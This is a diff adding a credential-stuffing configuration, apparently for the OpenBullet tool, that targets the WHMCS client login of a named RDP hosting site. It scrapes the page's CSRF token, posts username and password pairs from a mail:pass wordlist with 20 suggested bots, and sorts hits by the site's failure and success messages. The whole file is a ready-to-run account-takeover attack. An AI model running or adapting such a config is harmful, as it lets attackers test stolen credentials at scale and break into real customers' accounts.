@@ -1,0 +1,47 @@
+[SETTINGS]
+{
+  "Name": "AmazingRDP",
+  "SuggestedBots": 20,
+  "LastModified": "2018-05-16T21:34:34.9504444+00:00",
+  "AdditionalInfo": "Currently does not capture anything, feel free to add it if you would like.",
+  "Author": "Rebel",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://amazingrdp.com/whmcs/dologin.php" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://amazingrdp.com/whmcs/clientarea.php" 
+  HEADER "origin: https://amazingrdp.com" 
+PARSE "<SOURCE>" LR "csrfToken = '" "'" Recursive=FALSE -> VAR "token" "" "" 
+REQUEST POST "https://amazingrdp.com/whmcs/dologin.php" AutoRedirect=TRUE 
+  CONTENT "token=<token>&username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://amazingrdp.com/whmcs/clientarea.php" 
+  HEADER "origin: https://amazingrdp.com" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Login Details Incorrect. Please try again." 
+  KEYCHAIN Success OR 
+    KEY "Your Active Products/Services" 
